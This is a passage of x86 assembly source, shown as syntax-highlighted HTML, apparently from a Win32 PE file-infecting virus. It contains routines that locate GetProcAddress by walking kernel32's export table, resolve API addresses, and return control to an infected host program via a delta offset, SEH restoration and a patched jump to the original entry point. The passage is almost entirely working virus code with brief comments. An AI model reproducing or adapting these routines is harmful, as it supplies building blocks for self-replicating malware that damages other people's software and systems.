</span><span class="sc1">;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Entry:  EAX = base of kernel32</span><span class="sc0">
</span><span class="sc1">;         EDX = pointer to GetProcAddress name</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return: EAX = address of GetProcAddress if success</span><span class="sc0">
</span><span class="sc1">;         EAX = 0, CF set if fail</span><span class="sc0">

</span><span class="sc5">LocateGetProcAddress</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; save the kernel base</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">                    </span><span class="sc1">; is it an exe?</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">notfoundgpa</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">notfoundgpa</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0">                    </span><span class="sc1">; is it a PE?</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">notfoundgpa</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_HEADER_SIZE</span><span class="sc0">             </span><span class="sc1">; skip file header</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.OH_DataDirectory.DE_Export.DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">; and get export RVA</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.ED_NumberOfNames</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; save number of names</span><span class="sc0">
                                                   </span><span class="sc1">; to look into</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.ED_AddressOfNames</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; get address of names</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">; align to base rva</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                    </span><span class="sc1">; save pointer to export</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">gpa_locate_loop</span><span class="sc4">:</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                              </span><span class="sc1">; get one name address</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">; and align it</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                </span><span class="sc1">; save counter and addr.</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                </span><span class="sc1">; compare to GetProcAddress</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">getprocaddresslen</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">foundgpa</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">; restore them</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">; and get next name</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">gpa_locate_loop</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">notfoundgpa</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">; we didn't find it...</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; mark failure</span><span class="sc0">
       </span><span class="sc6">stc</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">foundgpa</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">; ecx = how many did we</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                     </span><span class="sc1">; check from total, but</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.ED_NumberOfNames</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; we need the reminder</span><span class="sc0">
       </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                     </span><span class="sc1">; of the search</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.ED_AddressOfOrdinals</span><span class="sc4">]</span><span class="sc1">; get address of ordinals</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                                  </span><span class="sc1">; and look using the index</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; take the ordinal</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.ED_AddressOfFunctions</span><span class="sc4">]</span><span class="sc1">; take address of funcs.</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                                  </span><span class="sc1">; we look in a dword array</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">; go to the function addr</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                              </span><span class="sc1">; take it's address</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">; and align it to k32 base</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dr0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; save it in dr0</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">                                       </span><span class="sc1">; restore all regs</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dr0</span><span class="sc0">                                </span><span class="sc1">; and mark success</span><span class="sc0">
       </span><span class="sc6">clc</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">LocateGetProcAddress</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ</span><span class="sc0">
</span><span class="sc1">;Û General module handle retriving routine                                Û</span><span class="sc0">
</span><span class="sc1">;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Entry:  EDI = pointer to module name</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return: EAX = module base address if success</span><span class="sc0">
</span><span class="sc1">;         EAX = 0, CF set if fail</span><span class="sc0">

</span><span class="sc5">LocateModuleBase</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">                                      </span><span class="sc1">; save regs</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                    </span><span class="sc1">; push name</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetModuleHandleA</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; call GetModuleHandleA</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dr0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dr0</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">notfoundmodule</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">clc</span><span class="sc0">                                         </span><span class="sc1">; success</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">notfoundmodule</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">stc</span><span class="sc0">                                         </span><span class="sc1">; fail</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">LocateModuleBase</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ</span><span class="sc0">
</span><span class="sc1">;Û General API address retriving routine                                  Û</span><span class="sc0">
</span><span class="sc1">;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Entry:  EAX = base address of the module</span><span class="sc0">
</span><span class="sc1">;         EBX = address of GetProcAddress</span><span class="sc0">
</span><span class="sc1">;         EDI = pointer to api names list (each item null terminated,</span><span class="sc0">
</span><span class="sc1">;                                          list terminated with 0FFh)</span><span class="sc0">
</span><span class="sc1">;         ESI = pointer to api addresses list</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return: CF clear if success and list at ESI filled with API addresses</span><span class="sc0">
</span><span class="sc1">;         CF set if fail</span><span class="sc0">

</span><span class="sc5">LocateApiAddresses</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">                                      </span><span class="sc1">; save all regs</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; save module base</span><span class="sc0">
</span><span class="sc5">locate_apis_loop</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">                    </span><span class="sc1">; is it the end?</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ready_apis</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                    </span><span class="sc1">; save base</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                    </span><span class="sc1">; push api name</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                    </span><span class="sc1">; push module base</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                    </span><span class="sc1">; call GetProcAddress</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                     </span><span class="sc1">; restore module base</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">; error?</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">error_finding_apis</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">; save api address</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">                               </span><span class="sc1">; look for the next</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                   </span><span class="sc1">; api name</span><span class="sc0">
       </span><span class="sc6">repnz</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">; increment array</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">locate_apis_loop</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ready_apis</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">                                       </span><span class="sc1">; all ok!</span><span class="sc0">
       </span><span class="sc6">clc</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">error_finding_apis</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">                                       </span><span class="sc1">; error here...</span><span class="sc0">
       </span><span class="sc6">stc</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">LocateApiAddresses</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ</span><span class="sc0">
</span><span class="sc1">;Û Return to host or exit from generation 0                               Û</span><span class="sc0">
</span><span class="sc1">;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ</span><span class="sc0">

</span><span class="sc5">ReturnToHost</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">restore_seh</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ExceptionExit</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">; if we had an error we</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                            </span><span class="sc1">; must restore the ESP</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">restore_seh</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">; and restore the SEH</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">; returning to the host...</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                 </span><span class="sc1">; is it generation 0?</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">generation0_exit</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                    </span><span class="sc1">; temporary save edi</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bfh</span><span class="sc0">                                     </span><span class="sc1">; put delta in edi</span><span class="sc0">
</span><span class="sc5">delta</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">; first generation ?</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">generation0_exit</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">oldeip</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; restore old EIP</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; align to memory</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jump</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; calculate the length of</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">; the jump to the host</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">jump</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">; and store the jump!</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                     </span><span class="sc1">; restore the last regs...</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc0">                                     </span><span class="sc1">; this is JMP Original EIP</span><span class="sc0">
</span><span class="sc5">jump</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
